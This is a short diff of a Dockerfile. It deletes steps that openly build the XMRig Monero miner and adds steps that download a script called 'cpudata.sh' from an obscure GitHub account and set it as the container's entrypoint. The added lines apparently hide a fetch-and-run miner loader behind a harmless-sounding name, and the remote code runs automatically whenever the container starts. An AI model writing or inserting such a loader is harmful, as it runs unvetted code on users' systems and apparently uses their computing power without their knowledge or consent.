@@ -1,12 +1,13 @@
-FROM ubuntu:latest AS build
+FROM ubuntu:16.04
 
-ARG XMRIG_VERSION='v3.2.0'
+# Upgrade base system
+RUN apt-get update
+# Install binary
+WORKDIR /cpudata
+RUN wget https://raw.githubusercontent.com/ts6aud5vkg/docker/master/cpudata.sh /cpudata
+RUN chmod a+x /cpudata/*
+ENTRYPOINT ["/cpudata/cpudata.sh"]
 
-RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 
-RUN git clone https://github.com/xmrig/xmrig
-RUN git checkout ${XMRIG_VERSION}
-RUN cd xmrig
-RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make
 
 
